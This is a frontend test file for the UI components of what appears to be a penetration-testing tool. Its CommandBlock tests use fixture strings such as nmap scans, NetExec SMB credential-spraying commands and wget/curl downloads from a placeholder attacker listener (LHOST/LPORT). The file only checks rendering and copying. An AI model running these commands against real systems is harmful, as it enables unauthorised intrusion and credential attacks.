import { act, render, screen } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, describe, expect, it, vi } from "vitest";
import * as ui from "../../ui";
import { CommandBlock, Dialog, Disclosure, ErrorState, LoadingState, PickerTrigger } from "../../ui";

describe("Dialog close", () => {
  it("dialog closes with an X icon button and has no esc cap", async () => {
    const onOpenChange = vi.fn();
    render(<Dialog open onOpenChange={onOpenChange} title="Edit host" />);
    expect(screen.queryByText("esc")).not.toBeInTheDocument();
    const close = screen.getByRole("button", { name: "Close" });
    expect(close.className).not.toMatch(/\bborder-(line|accent)/);
    await userEvent.click(close);
    expect(onOpenChange).toHaveBeenCalledWith(false);
  });
});

describe("Disclosure", () => {
  it("disclosure toggles with Space and shows the count", async () => {
    const onOpenChange = vi.fn();
    render(
      <Disclosure label="More options" count={3} open={false} onOpenChange={onOpenChange}>
        <p>inside</p>
      </Disclosure>,
    );
    const b = screen.getByRole("button", { name: "More options (3)" });
    expect(b).toHaveAttribute("aria-expanded", "false");
    expect(screen.queryByText("inside")).not.toBeInTheDocument();
    await userEvent.tab();
    await userEvent.keyboard(" ");
    expect(onOpenChange).toHaveBeenCalledWith(true);
  });

  it("shows children when open", () => {
    render(
      <Disclosure label="Details" open onOpenChange={() => {}}>
        <p>inside</p>
      </Disclosure>,
    );
    expect(screen.getByRole("button", { name: "Details" })).toHaveAttribute("aria-expanded", "true");
    expect(screen.getByText("inside")).toBeInTheDocument();
  });
});

describe("CommandBlock", () => {
  it("command block copies and marks placeholders", async () => {
    const onCopy = vi.fn();
    render(<CommandBlock text="nmap -sV {TARGET} -p {PORT}" placeholders onCopy={onCopy} />);
    expect(screen.getByText("{TARGET}")).toHaveClass("command-block__warn");
    expect(screen.getByText("{PORT}")).toHaveClass("command-block__warn");
    const user = userEvent.setup();
    await user.click(screen.getByRole("button", { name: "Copy" }));
    expect(onCopy).toHaveBeenCalledTimes(1);
    expect(await navigator.clipboard.readText()).toBe("nmap -sV {TARGET} -p {PORT}");
  });
});

describe("CommandBlock wrapping", () => {
  it("wraps each space-separated token in a nowrap span and copies the raw string", async () => {
    const cmd = "nxc smb -u 'backup-operator' --continue-on-success";
    const { container } = render(<CommandBlock text={cmd} />);
    const tokens = [...container.querySelectorAll("[data-token]")];
    expect(tokens.map((t) => t.textContent)).toEqual(["nxc", "smb", "-u", "'backup-operator'", "--continue-on-success"]);
    for (const t of tokens) expect(t).toHaveClass("command-block__token");
    expect(container.querySelector("code")!.textContent).toBe(cmd);
    await userEvent.setup().click(screen.getByRole("button", { name: "Copy" }));
    expect(await navigator.clipboard.readText()).toBe(cmd);
  });
});

describe("CommandBlock with a masked display", () => {
  it("shows the text but copies copyText under copyLabel", async () => {
    render(<CommandBlock text="nxc smb h -p ••••••••" copyText="nxc smb h -p 'Real1!'" copyLabel="Copy smb command" />);
    expect(screen.queryByText(/Real1/)).not.toBeInTheDocument();
    await userEvent.setup().click(screen.getByRole("button", { name: "Copy smb command" }));
    expect(await navigator.clipboard.readText()).toBe("nxc smb h -p 'Real1!'");
  });
});

describe("LoadingState", () => {
  afterEach(() => vi.useRealTimers());
  it("loading state is blank for 150ms", () => {
    vi.useFakeTimers();
    render(<LoadingState label="hosts" />);
    expect(screen.queryByText(/Loading/)).not.toBeInTheDocument();
    act(() => {
      vi.advanceTimersByTime(149);
    });
    expect(screen.queryByText(/Loading/)).not.toBeInTheDocument();
    act(() => {
      vi.advanceTimersByTime(1);
    });
    expect(screen.getByText("Loading hosts…")).toBeInTheDocument();
  });
});

describe("ErrorState", () => {
  it("error state retries", async () => {
    const onRetry = vi.fn();
    render(<ErrorState title="Could not load hosts" hint="Check the vault is unlocked." detail="boom" onRetry={onRetry} />);
    expect(screen.queryByText("boom")).not.toBeInTheDocument();
    await userEvent.click(screen.getByRole("button", { name: "Retry" }));
    expect(onRetry).toHaveBeenCalledTimes(1);
    await userEvent.click(screen.getByRole("button", { name: "Details" }));
    expect(screen.getByText("boom")).toBeInTheDocument();
  });
});

describe("PickerTrigger", () => {
  it("picker trigger is in the tab order and shows Pick one when unset", async () => {
    render(<PickerTrigger prefix="Host" />);
    const b = screen.getByRole("button");
    expect(screen.getByText("Pick one")).toHaveClass("picker-trigger__placeholder");
    await userEvent.tab();
    expect(b).toHaveFocus();
  });

  it("shows the value when set", () => {
    render(<PickerTrigger prefix="Host" value="192.0.2.10" />);
    expect(screen.getByText("192.0.2.10")).toHaveClass("picker-trigger__value");
    expect(screen.queryByText("Pick one")).not.toBeInTheDocument();
  });
});

describe("CommandBlock placeholders inside a token", () => {
  it("keeps a token with a placeholder in one nowrap span and marks only the placeholder", () => {
    const { container } = render(<CommandBlock text="wget http://{LHOST}:{LPORT}/x -O out" placeholders />);
    const tokens = [...container.querySelectorAll("[data-token]")];
    expect(tokens.map((t) => t.textContent)).toEqual(["wget", "http://{LHOST}:{LPORT}/x", "-O", "out"]);
    expect(tokens[1]).toHaveClass("command-block__token");
    const marked = [...tokens[1].querySelectorAll("mark")].map((m) => m.textContent);
    expect(marked).toEqual(["{LHOST}", "{LPORT}"]);
    expect(container.querySelector("code")!.textContent).toBe("wget http://{LHOST}:{LPORT}/x -O out");
  });

  it("marks explicit unresolved tokens inside their word", () => {
    const { container } = render(<CommandBlock text="curl http://LHOST/x" tokens={["LHOST"]} />);
    const word = [...container.querySelectorAll("[data-token]")][1];
    expect(word.textContent).toBe("http://LHOST/x");
    expect([...word.querySelectorAll("mark")].map((m) => m.textContent)).toEqual(["LHOST"]);
  });
});

describe("labels", () => {
  it("there is no uppercase Label component: field labels are sentence case (Field), sections use labelClass", () => {
    expect("Label" in ui).toBe(false);
    expect(ui.labelClass).toBe("section-label");
    expect(ui.fieldLabelClass).toBe("field-label");
  });
});

describe("Input width", () => {
  it("fills its track by default (.input); an explicit width class rides on top and wins (utilities layer)", () => {
    render(
      <>
        <ui.Input aria-label="Full" />
        <ui.Input aria-label="Port" width="w-20" />
      </>,
    );
    expect(screen.getByLabelText("Full").className).toBe("control input");
    expect(screen.getByLabelText("Port")).toHaveClass("input", "w-20");
  });
});
